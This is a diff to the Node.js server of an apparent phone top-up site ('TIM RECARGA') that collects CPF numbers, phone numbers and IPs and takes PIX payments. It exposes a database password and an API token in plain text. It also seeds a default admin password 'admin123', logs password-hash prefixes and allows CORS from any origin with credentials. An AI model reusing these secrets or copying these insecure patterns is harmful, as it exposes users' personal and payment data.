@@ -17,7 +17,13 @@ const JWT_EXPIRES = '24h';
 const PLUMIFY_PRODUCT_HASH = process.env.PLUMIFY_PRODUCT_HASH || 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = process.env.PLUMIFY_API_TOKEN || '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
 
-const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://neondb_owner:npg_aP8rYnLRtq6f@ep-restless-glitter-b4fvqa2p-pooler.c-6.us-east-2.aws.neon.tech/neondb?sslmode=require&channel_binding=require';
+// DATABASE_URL obrigatoriamente vem do ambiente
+const DATABASE_URL = process.env.DATABASE_URL;
+if (!DATABASE_URL) {
+  console.error('ERRO FATAL: DATABASE_URL não configurada nas variáveis de ambiente.');
+  console.error('Configure no Render: Web Service > Environment > DATABASE_URL');
+  process.exit(1);
+}
 
 app.use(cors({ origin: '*', credentials: true }));
 app.use(bodyParser.json({ limit: '10mb' }));
@@ -33,7 +39,7 @@ const pool = new Pool({
   connectionTimeoutMillis: 10000,
 });
 
-
+// ============ HELPERS ============
 function getClientIP(req) {
   return req.clientIp || req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'unknown';
 }
@@ -93,7 +99,7 @@ function authenticate(req, res, next) {
   }
 }
 
-
+// ============ INICIALIZAÇÃO DO BANCO ============
 async function initDatabase() {
   const client = await pool.connect();
   try {
@@ -191,7 +197,7 @@ async function initDatabase() {
     await client.query(`CREATE INDEX IF NOT EXISTS idx_payments_tid ON payments(transaction_id);`);
     await client.query(`CREATE INDEX IF NOT EXISTS idx_logs_data ON logs(data DESC);`);
 
-    
+    // Admin master padrão
     const adminCheck = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
     if (adminCheck.rows.length === 0) {
       const hashedPassword = bcrypt.hashSync('admin123', 10);
@@ -208,14 +214,11 @@ async function initDatabase() {
       }
     }
 
-    
+    // PIN administrativo
     const pinCheck = await client.query('SELECT valor FROM config WHERE chave = $1', ['admin_pin']);
     if (pinCheck.rows.length === 0) {
       const pin = gerarPin();
-      await client.query(
-        'INSERT INTO config (chave, valor) VALUES ($1, $2)',
-        ['admin_pin', pin]
-      );
+      await client.query('INSERT INTO config (chave, valor) VALUES ($1, $2)', ['admin_pin', pin]);
       console.log('PIN administrativo gerado:', pin);
     }
 
@@ -229,9 +232,9 @@ async function initDatabase() {
 
 initDatabase();
 
-
-
-
+// ============================================================
+// ROTAS PÚBLICAS
+// ============================================================
 
 app.post('/api/create-sale', async (req, res) => {
   const { phone, cpf, value, bonus } = req.body;
@@ -308,8 +311,8 @@ app.post('/api/create-sale', async (req, res) => {
 
       await pool.query(
         `INSERT INTO clientes (nome, cpf, telefone, ip)
-         SELECT 'Cliente TIM', $1, $2, $3
-         WHERE NOT EXISTS (SELECT 1 FROM clientes WHERE cpf = $1)`,
+         SELECT 'Cliente TIM', $1::varchar, $2::varchar, $3::text
+         WHERE NOT EXISTS (SELECT 1 FROM clientes WHERE cpf = $1::varchar)`,
         [cpf, phone, ip]
       ).catch(e => console.log('Erro cliente:', e.message));
 
@@ -399,21 +402,29 @@ app.post('/api/visitante', async (req, res) => {
   }
 });
 
-
-
-
+// ============================================================
+// ROTAS ADMIN
+// ============================================================
 
 app.post('/api/admin/login', async (req, res) => {
   const { username, password } = req.body;
   const ip = getClientIP(req);
 
+  console.log('[LOGIN] tentativa:', { username, senhaLen: password?.length });
+
   try {
     const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', [username]);
     if (result.rows.length === 0) {
+      console.log('[LOGIN] usuário não encontrado:', username);
       return res.status(401).json({ error: 'Credenciais inválidas' });
     }
 
+    console.log('[LOGIN] hash no banco:', result.rows[0].senha_hash?.substring(0, 20) + '...');
+    console.log('[LOGIN] hash length:', result.rows[0].senha_hash?.length);
+
     const valid = await bcrypt.compare(password, result.rows[0].senha_hash);
+    console.log('[LOGIN] bcrypt result:', valid);
+
     if (!valid) {
       await logSeguranca('Sistema', 'login_falha', ip, `Senha incorreta: ${username}`);
       return res.status(401).json({ error: 'Credenciais inválidas' });
@@ -452,7 +463,6 @@ app.get('/api/admin/verify', authenticate, (req, res) => {
   res.json({ valid: true, user: req.user });
 });
 
-
 app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
   const { senhaAtual, novaSenha } = req.body;
   const ip = getClientIP(req);
@@ -475,7 +485,6 @@ app.post('/api/admin/trocar-senha', authenticate, async (req, res) => {
   }
 });
 
-
 app.put('/api/admin/perfil', authenticate, async (req, res) => {
   const { nome, email } = req.body;
   try {
@@ -490,7 +499,7 @@ app.put('/api/admin/perfil', authenticate, async (req, res) => {
   }
 });
 
-
+// PIN
 app.get('/api/admin/pin', authenticate, async (req, res) => {
   try {
     const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
@@ -530,7 +539,7 @@ async function verificarPin(pin) {
   return r.rows[0].valor === String(pin);
 }
 
-
+// GERENCIAR ADMINS
 app.get('/api/admin/admins', authenticate, async (req, res) => {
   try {
     const eu = await pool.query('SELECT is_master FROM admin_users WHERE id = $1', [req.user.id]);
@@ -629,7 +638,7 @@ app.delete('/api/admin/admins/:id', authenticate, async (req, res) => {
   }
 });
 
-
+// DASHBOARD E LISTAS
 app.get('/api/admin/dashboard', authenticate, async (req, res) => {
   try {
     const totalRecargas = await pool.query('SELECT COUNT(*) FROM recargas');
@@ -780,6 +789,7 @@ app.get('/health', async (req, res) => {
   }
 });
 
+// PÁGINAS
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin', 'index.html')));
 app.get('/recarga/pagamento', (req, res) => res.sendFile(path.join(__dirname, 'public', 'recarga', 'pagamento.html')));
@@ -787,6 +797,7 @@ app.get('/recarga/pix', (req, res) => res.sendFile(path.join(__dirname, 'public'
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log('');
+  console.log('  TIM RECARGA - Servidor Online');
   console.log('  Porta: ' + PORT);
   console.log('');
 });
